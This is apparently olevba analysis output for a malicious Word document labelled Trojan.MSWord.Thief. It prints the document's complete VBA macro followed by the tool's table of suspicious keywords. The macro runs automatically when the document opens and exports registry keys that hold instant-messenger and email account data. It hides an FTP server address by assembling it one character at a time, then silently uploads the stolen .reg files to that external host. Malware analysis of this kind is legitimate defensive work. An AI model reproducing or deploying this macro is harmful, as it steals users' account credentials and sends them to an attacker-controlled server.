olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Thief
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Thief - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'HAHAHAHA If you have found this... Greetz out to alt.hackers.malicious
' all those guys who think they no everything about everyone jsut from a posting
'  Well, maybe this will teach them a thing or two
'  Love anonymous

Dim commandx As String
Dim commandy As String
Dim commandz As String

Dim mychar As String
Dim fnamez As String
Dim fnamezz As String
Dim info1 As String
Dim info2 As String
Dim info3 As String
Dim info4 As String
Dim info5 As String
Dim info6 As String
Dim info7 As String

info1 = Application.UserAddress
info2 = Application.UserName
info3 = Application.UserInitials




fnamez = Second(VBA.DateTime.Now)
'Application.UserAddress



mychar = Chr$(34)

 Dim var1(4) As String
     Dim var2(13) As String
     Dim var3(9) As String
     Dim var4(3) As String
     Dim var5(3) As String
     Dim var6(6) As String
     Dim var7(7) As String
     Dim var8(10) As String
     Dim var9(4) As String
     Dim var10(11) As String
     Dim carriage(2) As String
     Dim Location As Integer
     Dim errorp

commandx = "regedit /e c:\" & fnamez & "reg1.reg " & mychar & "HKEY_CURRENT_USER\Software\America Online\AOL Instant Messenger (TM)\CurrentVersion\Users" & mychar



commandy = "regedit /e c:\" & fnamez & "reg2.reg " & mychar & "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info" & mychar

commandz = "regedit /e c:\" & fnamez & "reg3.reg " & mychar & "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts" & mychar

fnamezz = "c:\" & fnamez & "reg4.reg"




Dim RetVal
RetVal = Shell(commandx, 0)    ' Run Calculator.
RetVal = Shell(commandy, 0)
RetVal = Shell(commandz, 0)
     
     carriage(1) = Chr$(13)
     carriage(2) = Chr$(10)
     Location = 0
     var1(1) = "o"
     var1(2) = "p"
     var1(3) = "e"
     var1(4) = "n"
     
     var2(1) = "1"
     var2(2) = "9"
     var2(3) = "5"
     var2(4) = "."
     var2(5) = "4"
     var2(6) = "7"
     var2(7) = "."
     var2(8) = "2"
     var2(9) = "1"
     var2(10) = "."
     var2(11) = "1"
     var2(12) = "3"
     var2(13) = "2"
     
     
     var3(1) = "a"
     var3(2) = "n"
     var3(3) = "o"
     var3(4) = "n"
     var3(5) = "y"
     var3(6) = "m"
     var3(7) = "o"
     var3(8) = "u"
     var3(9) = "s"
     
     var4(1) = "z"
     var4(2) = "@"
     var4(3) = "z"
     
     var5(1) = "a"
     var5(2) = "s"
     var5(3) = "c"
     
     var6(1) = "p"
     var6(2) = "r"
     var6(3) = "o"
     var6(4) = "m"
     var6(5) = "p"
     var6(6) = "t"
     
     var10(1) = "c"
     var10(2) = "d"
     var10(3) = " "
     var10(4) = "I"
     var10(5) = "n"
     var10(6) = "c"
     var10(7) = "o"
     var10(8) = "m"
     var10(9) = "i"
     var10(10) = "n"
     var10(11) = "g"
     
     var7(1) = "l"
     var7(2) = "c"
     var7(3) = "d"
     var7(4) = " "
     var7(5) = "c"
     var7(6) = ":"
     var7(7) = "\"
     
     
     var8(1) = "m"
     var8(2) = "p"
     var8(3) = "u"
     var8(4) = "t"
     var8(5) = " "
     var8(6) = "*"
     var8(7) = "."
     var8(8) = "r"
     var8(9) = "e"
     var8(10) = "g"
     
     var9(1) = "q"
     var9(2) = "u"
     var9(3) = "i"
     var9(4) = "t"
     
     Open fnamezz For Random As 5
     Put #5, 1, info1
     Put #5, 2, info2
     Put #5, 3, info3
     Close 5
     
     
     
     
     Open "c:\list4.txt" For Binary As 4
     
     For i = 1 To 4 'open
          Location = Location + 1
          Put #4, Location, var1(i)
     Next
     Location = Location + 1
     Put #4, Location, var7(4)
     
     For i = 1 To 13 'ipaddy
          Location = Location + 1
          Put #4, Location, var2(i)
     Next
     Location = Location + 1
     Put #4, Location, carriage(1)
     Location = Location + 1
     Put #4, Location, carriage(2)
     
     For i = 1 To 9 'anonymous
          Location = Location + 1
          Put #4, Location, var3(i)
     Next
     Location = Location + 1
     Put #4, Location, carriage(1)
     Location = Location + 1
     Put #4, Location, carriage(2)
     
     For i = 1 To 3 'z@z
          Location = Location + 1
          Put #4, Location, var4(i)
     Next
     Location = Location + 1
     Put #4, Location, carriage(1)
     Location = Location + 1
     Put #4, Location, carriage(2)
     
     
     For i = 1 To 3 'bin
          Location = Location + 1
          Put #4, Location, var5(i)
     Next
     Location = Location + 1
     Put #4, Location, carriage(1)
     Location = Location + 1
     Put #4, Location, carriage(2)
     
     For i = 1 To 6 'prompt
          Location = Location + 1
          Put #4, Location, var6(i)
     Next
     Location = Location + 1
     Put #4, Location, carriage(1)
     Location = Location + 1
     Put #4, Location, carriage(2)
     
     For i = 1 To 11 'change dir
          Location = Location + 1
          Put #4, Location, var10(i)
     Next
     Location = Location + 1
     Put #4, Location, carriage(1)
     Location = Location + 1
     Put #4, Location, carriage(2)
     
     For i = 1 To 7 'change dir
          Location = Location + 1
          Put #4, Location, var7(i)
     Next
     Location = Location + 1
     Put #4, Location, carriage(1)
     Location = Location + 1
     Put #4, Location, carriage(2)
     
     For i = 1 To 10 'mput
          Location = Location + 1
          Put #4, Location, var8(i)
     Next
     Location = Location + 1
     Put #4, Location, carriage(1)
     Location = Location + 1
     Put #4, Location, carriage(2)
     
     For i = 1 To 4 'quit
          Location = Location + 1
          Put #4, Location, var9(i)
     Next
     Location = Location + 1
     Put #4, Location, carriage(1)
     Location = Location + 1
     Put #4, Location, carriage(2)
     
     Close 4
     
     
     ' NOW RUN COMMAND
     
     errorp = Shell("ftp -v -s:c:\list4.txt", 0)

   ' Location = 1
    'Open "c:\list4.txt" For Binary As 5
    
    
    
    
'For I = 1 To 100
 '    Put #5, Location, carriage(1)
  '   Location = Location + 1
'Next
 
'Close 5


On Error Resume Next


End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |reg1.reg            |Executable file name                         |
|IOC       |reg2.reg            |Executable file name                         |
|IOC       |reg3.reg            |Executable file name                         |
|IOC       |reg4.reg            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

